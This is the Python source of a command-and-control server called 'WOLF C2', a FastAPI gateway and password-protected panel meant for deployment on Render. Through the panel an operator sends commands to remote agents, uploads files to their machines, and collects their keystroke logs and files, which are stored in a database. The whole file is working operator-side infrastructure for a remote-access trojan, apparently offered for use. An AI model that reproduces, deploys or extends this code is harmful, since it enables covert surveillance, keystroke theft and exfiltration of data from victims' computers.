"""WOLF C2 — FastAPI agent gateway + browser control panel.

Deploy target: Render (see render.yaml).
Agents connect over WSS, the panel talks to the same origin.
"""
from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import json
import os
import secrets
import sqlite3
import time
import uuid
from pathlib import Path

from fastapi import (Depends, FastAPI, File, Form, HTTPException, Request,
                     UploadFile, WebSocket, WebSocketDisconnect)
from fastapi.responses import (FileResponse, HTMLResponse, JSONResponse,
                               RedirectResponse, Response)
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

# --------------------------------------------------------------------------
# config
# --------------------------------------------------------------------------
BASE = Path(__file__).resolve().parent
DATA = Path(os.environ.get("DATA_DIR", str(BASE / "data")))
FILES = DATA / "files"
DATA.mkdir(parents=True, exist_ok=True)
FILES.mkdir(parents=True, exist_ok=True)

PANEL_PASSWORD = os.environ.get("PANEL_PASSWORD", "")
if not PANEL_PASSWORD:
    PANEL_PASSWORD = secrets.token_urlsafe(9)
    print(f"[!] PANEL_PASSWORD unset -> generated: {PANEL_PASSWORD}", flush=True)

SECRET = (os.environ.get("SECRET_KEY") or secrets.token_hex(32)).encode()

AGENT_TOKEN = os.environ.get("AGENT_TOKEN", "")
if not AGENT_TOKEN:
    AGENT_TOKEN = secrets.token_urlsafe(24)
    print(f"[!] AGENT_TOKEN unset -> generated: {AGENT_TOKEN}", flush=True)

COOKIE = "wr_panel"
TTL = 7 * 24 * 3600
CHUNK = 256 * 1024

app = FastAPI(title="wr-c2", docs_url=None, redoc_url=None)
app.mount("/static", StaticFiles(directory=str(BASE / "static")), name="static")
templates = Jinja2Templates(directory=str(BASE / "templates"))

# --------------------------------------------------------------------------
# storage
# --------------------------------------------------------------------------
SCHEMA = """
CREATE TABLE IF NOT EXISTS agents(
  id TEXT PRIMARY KEY, host TEXT, user TEXT, os TEXT, arch TEXT, pid INTEGER,
  admin INTEGER, ip TEXT, first_seen REAL, last_seen REAL, note TEXT
);
CREATE TABLE IF NOT EXISTS commands(
  id TEXT PRIMARY KEY, agent_id TEXT, module TEXT, args TEXT, created REAL,
  status TEXT, ok INTEGER, body TEXT
);
CREATE INDEX IF NOT EXISTS ix_cmd ON commands(agent_id, created DESC);
CREATE TABLE IF NOT EXISTS files(
  id TEXT PRIMARY KEY, agent_id TEXT, kind TEXT, path TEXT, name TEXT,
  size INTEGER, ts REAL, data BLOB
);
CREATE INDEX IF NOT EXISTS ix_files ON files(agent_id, ts DESC);
CREATE TABLE IF NOT EXISTS keylogs(
  id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id TEXT, ts REAL, text TEXT
);
CREATE INDEX IF NOT EXISTS ix_keylog ON keylogs(agent_id, ts DESC);
"""


def db() -> sqlite3.Connection:
    con = sqlite3.connect(DATA / "c2.db", timeout=10)
    con.row_factory = sqlite3.Row
    con.execute("PRAGMA journal_mode=WAL")
    return con


with db() as _con:
    _con.executescript(SCHEMA)


def q(sql: str, params: tuple = ()) -> list[dict]:
    with db() as con:
        return [dict(r) for r in con.execute(sql, params).fetchall()]


def x(sql: str, params: tuple = ()) -> None:
    with db() as con:
        con.execute(sql, params)
        con.commit()


# --------------------------------------------------------------------------
# session
# --------------------------------------------------------------------------
def sign(payload: str) -> str:
    mac = hmac.new(SECRET, payload.encode(), hashlib.sha256).hexdigest()[:32]
    return f"{payload}.{mac}"


def verify(token: str | None) -> bool:
    if not token or "." not in token:
        return False
    payload, mac = token.rsplit(".", 1)
    want = hmac.new(SECRET, payload.encode(), hashlib.sha256).hexdigest()[:32]
    if not hmac.compare_digest(mac, want):
        return False
    try:
        exp = int(payload.split("|")[1])
    except (IndexError, ValueError):
        return False
    return exp > time.time()


def require_panel(request: Request) -> None:
    if not verify(request.cookies.get(COOKIE)):
        raise HTTPException(status_code=401, detail="unauthorized")


def agent_ok(token: str | None) -> bool:
    return bool(token) and hmac.compare_digest(token, AGENT_TOKEN)


# --------------------------------------------------------------------------
# live sessions
# --------------------------------------------------------------------------
class AgentSession:
    def __init__(self, aid: str, ws: WebSocket):
        self.id = aid
        self.ws = ws
        self.queue: asyncio.Queue = asyncio.Queue()
        self.last_seen = time.time()
        self.info: dict = {}


LIVE: dict[str, AgentSession] = {}
PANELS: set[WebSocket] = set()
XFERS: dict[str, dict] = {}


async def pub(payload: dict) -> None:
    dead = []
    text = json.dumps(payload)
    for ws in list(PANELS):
        try:
            await ws.send_text(text)
        except Exception:
            dead.append(ws)
    for ws in dead:
        PANELS.discard(ws)


# --------------------------------------------------------------------------
# pages
# --------------------------------------------------------------------------
@app.get("/health")
async def health():
    return {"ok": True, "agents": len(LIVE), "ts": time.time()}


@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request):
    return templates.TemplateResponse(request=request, name="login.html", context={})


@app.post("/login")
async def login(request: Request, password: str = Form(...)):
    if not hmac.compare_digest(password, PANEL_PASSWORD):
        return RedirectResponse("/login?e=1", status_code=303)
    resp = RedirectResponse("/", status_code=303)
    payload = f"panel|{int(time.time()) + TTL}"
    resp.set_cookie(COOKIE, sign(payload), max_age=TTL, httponly=True,
                    samesite="lax", secure=request.url.scheme == "https")
    return resp


@app.get("/logout")
async def logout():
    resp = RedirectResponse("/login", status_code=303)
    resp.delete_cookie(COOKIE)
    return resp


@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    if not verify(request.cookies.get(COOKIE)):
        return RedirectResponse("/login", status_code=303)
    return templates.TemplateResponse(request=request, name="index.html", context={})


# --------------------------------------------------------------------------
# panel api
# --------------------------------------------------------------------------
@app.get("/api/agents", dependencies=[Depends(require_panel)])
async def api_agents():
    rows = q("SELECT * FROM agents ORDER BY last_seen DESC")
    for r in rows:
        r["online"] = r["id"] in LIVE
    return {"agents": rows}


@app.get("/api/agents/{aid}", dependencies=[Depends(require_panel)])
async def api_agent(aid: str):
    rows = q("SELECT * FROM agents WHERE id=?", (aid,))
    if not rows:
        raise HTTPException(404, "no such agent")
    agent = rows[0]
    agent["online"] = aid in LIVE
    return {
        "agent": agent,
        "commands": q("SELECT * FROM commands WHERE agent_id=? ORDER BY created DESC LIMIT 100", (aid,)),
        "files": q("SELECT id,kind,path,name,size,ts FROM files WHERE agent_id=? ORDER BY ts DESC LIMIT 100", (aid,)),
    }


@app.post("/api/agents/{aid}/cmd", dependencies=[Depends(require_panel)])
async def api_cmd(aid: str, body: dict):
    sess = LIVE.get(aid)
    if not sess:
        raise HTTPException(409, "agent offline")
    module = str(body.get("module", ""))[:64]
    args = body.get("args") or {}
    if not module:
        raise HTTPException(400, "module required")
    cid = uuid.uuid4().hex
    x("INSERT INTO commands(id,agent_id,module,args,created,status) VALUES(?,?,?,?,?,'queued')",
      (cid, aid, module, json.dumps(args), time.time()))
    await sess.queue.put({"type": "cmd", "id": cid, "module": module, "args": args})
    return {"id": cid}


@app.get("/api/files/{fid}", dependencies=[Depends(require_panel)])
async def api_file(fid: str):
    rows = q("SELECT name,kind,path,data FROM files WHERE id=?", (fid,))
    if not rows:
        raise HTTPException(404, "missing")
    row = rows[0]
    name = row["name"] or "download.bin"
    ext = Path(name).suffix.lower()
    mime = {".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
            ".gif": "image/gif", ".txt": "text/plain; charset=utf-8",
            ".json": "application/json", ".zip": "application/zip"}.get(ext, "application/octet-stream")
    return Response(content=row["data"], media_type=mime,
                    headers={"Content-Disposition": f'attachment; filename="{name}"'})


@app.get("/api/agents/{aid}/keylogs", dependencies=[Depends(require_panel)])
async def api_keylogs(aid: str):
    rows = q("SELECT ts,text FROM keylogs WHERE agent_id=? ORDER BY id ASC LIMIT 5000", (aid,))
    return {"logs": rows}


@app.delete("/api/agents/{aid}", dependencies=[Depends(require_panel)])
async def api_delete(aid: str, purge: bool = False):
    sess = LIVE.pop(aid, None)
    if sess:
        try:
            await sess.ws.close(code=1000)
        except Exception:
            pass
    if purge:
        x("DELETE FROM agents WHERE id=?", (aid,))
        x("DELETE FROM commands WHERE agent_id=?", (aid,))
        x("DELETE FROM files WHERE agent_id=?", (aid,))
        x("DELETE FROM keylogs WHERE agent_id=?", (aid,))
    await pub({"t": "agent", "agent": {"id": aid, "online": False, "removed": purge}})
    return {"ok": True}


@app.post("/api/agents/{aid}/upload", dependencies=[Depends(require_panel)])
async def api_upload(aid: str, path: str = Form(...), file: UploadFile = File(...)):
    sess = LIVE.get(aid)
    if not sess:
        raise HTTPException(409, "agent offline")
    blob = await file.read()
    tid = uuid.uuid4().hex
    total = max(1, (len(blob) + CHUNK - 1) // CHUNK)
    for i in range(total):
        slice_ = blob[i * CHUNK:(i + 1) * CHUNK]
        cid = uuid.uuid4().hex
        args = {"path": path, "tid": tid, "seq": i, "total": total,
                "data": base64.b64encode(slice_).decode(), "silent": i < total - 1}
        x("INSERT INTO commands(id,agent_id,module,args,created,status) VALUES(?,?,?,?,?,'queued')",
          (cid, aid, "upload", json.dumps(args), time.time()))
        await sess.queue.put({"type": "cmd", "id": cid, "module": "upload",
                              "args": {k: v for k, v in args.items() if k != "silent"}})
    return {"ok": True, "tid": tid, "chunks": total, "size": len(blob)}


# --------------------------------------------------------------------------
# panel socket
# --------------------------------------------------------------------------
@app.websocket("/panel/ws")
async def panel_ws(ws: WebSocket):
    if not verify(ws.cookies.get(COOKIE)):
        await ws.close(code=1008)
        return
    await ws.accept()
    PANELS.add(ws)
    try:
        while True:
            await ws.receive_text()
    except (WebSocketDisconnect, Exception):
        pass
    finally:
        PANELS.discard(ws)


# --------------------------------------------------------------------------
# agent socket
# --------------------------------------------------------------------------
@app.websocket("/ws")
async def agent_ws(ws: WebSocket):
    token = ws.headers.get("x-agent-token") or ws.query_params.get("t")
    if not agent_ok(token):
        await ws.close(code=1008)
        return
    await ws.accept()

    sess: AgentSession | None = None

    async def sender():
        assert sess
        while True:
            msg = await sess.queue.get()
            await ws.send_text(json.dumps(msg))

    send_task = None
    try:
        while True:
            raw = await ws.receive_text()
            msg = json.loads(raw)
            kind = msg.get("type")

            if kind == "hello":
                aid = str(msg.get("agent_id") or uuid.uuid4().hex)[:64]
                if sess is None:
                    sess = AgentSession(aid, ws)
                    LIVE[aid] = sess
                    send_task = asyncio.create_task(sender())
                    await pub({"t": "agent", "agent": {"id": aid, "online": True,
                                                       "host": msg.get("host")}})
                sess.info = msg
                sess.last_seen = time.time()
                now = time.time()
                x("""INSERT INTO agents(id,host,user,os,arch,pid,admin,ip,first_seen,last_seen)
                     VALUES(?,?,?,?,?,?,?,?,?,?)
                     ON CONFLICT(id) DO UPDATE SET host=excluded.host,user=excluded.user,
                       os=excluded.os,arch=excluded.arch,pid=excluded.pid,admin=excluded.admin,
                       ip=excluded.ip,last_seen=excluded.last_seen""",
                  (aid, msg.get("host"), msg.get("user"), msg.get("os"), msg.get("arch"),
                   msg.get("pid") or 0, 1 if msg.get("admin") else 0,
                   ws.client.host if ws.client else None, now, now))
                await pub({"t": "agent", "agent": {
                    "id": aid, "online": True, "host": msg.get("host"),
                    "user": msg.get("user"), "os": msg.get("os"), "arch": msg.get("arch"),
                    "admin": bool(msg.get("admin")), "pid": msg.get("pid"),
                    "last_seen": now}})

            elif kind == "pong":
                if sess:
                    sess.last_seen = time.time()

            elif kind == "result" and sess:
                cid = msg.get("id")
                body = msg.get("body") or {}
                x("UPDATE commands SET status='done', ok=?, body=? WHERE id=?",
                  (1 if body.get("ok") else 0, json.dumps(body), cid))
                row = q("SELECT args FROM commands WHERE id=?", (cid,))
                silent = False
                if row:
                    try:
                        silent = bool(json.loads(row[0]["args"]).get("silent"))
                    except Exception:
                        pass
                if not silent:
                    await pub({"t": "result", "agent_id": sess.id, "cmd_id": cid,
                               "body": body})
                sess.last_seen = time.time()

            elif kind == "event" and sess:
                await handle_event(sess, msg)

    except WebSocketDisconnect:
        pass
    except Exception as exc:  # noqa: BLE001
        print("[ws] agent error:", exc, flush=True)
    finally:
        if send_task:
            send_task.cancel()
        if sess and LIVE.get(sess.id) is sess:
            LIVE.pop(sess.id, None)
            x("UPDATE agents SET last_seen=? WHERE id=?", (time.time(), sess.id))
            await pub({"t": "agent", "agent": {"id": sess.id, "online": False}})


async def handle_event(sess: AgentSession, msg: dict) -> None:
    kind = msg.get("kind")

    if kind == "keylog":
        text = str(msg.get("data", ""))[:20000]
        if text:
            x("INSERT INTO keylogs(agent_id,ts,text) VALUES(?,?,?)",
              (sess.id, time.time(), text))
            await pub({"t": "keylog", "agent_id": sess.id, "text": text})

    elif kind == "xfer":
        xid = msg.get("xfer")
        key = f"{sess.id}:{xid}"
        seq = int(msg.get("seq") or 0)
        total = int(msg.get("total") or 1)
        blob = base64.b64decode(msg.get("data") or "")
        state = XFERS.setdefault(key, {"buf": bytearray(), "name": msg.get("name"),
                                       "meta": msg.get("meta") or {}, "total": total})
        state["buf"].extend(blob)
        if seq + 1 >= total:
            XFERS.pop(key, None)
            meta = state["meta"] or {}
            fid = uuid.uuid4().hex
            name = (meta.get("name") or f"{state['name']}-{int(time.time())}.bin")[:200]
            path = (meta.get("path") or "")[:1000]
            data = bytes(state["buf"])
            x("INSERT INTO files(id,agent_id,kind,path,name,size,ts,data) VALUES(?,?,?,?,?,?,?,?)",
              (fid, sess.id, state["name"], path, name, len(data), time.time(), data))
            await pub({"t": "file", "agent_id": sess.id, "file": {
                "id": fid, "kind": state["name"], "name": name,
                "path": path, "size": len(data), "ts": time.time()}})

    elif kind == "log":
        await pub({"t": "log", "agent_id": sess.id, "text": str(msg.get("data", ""))[:2000]})
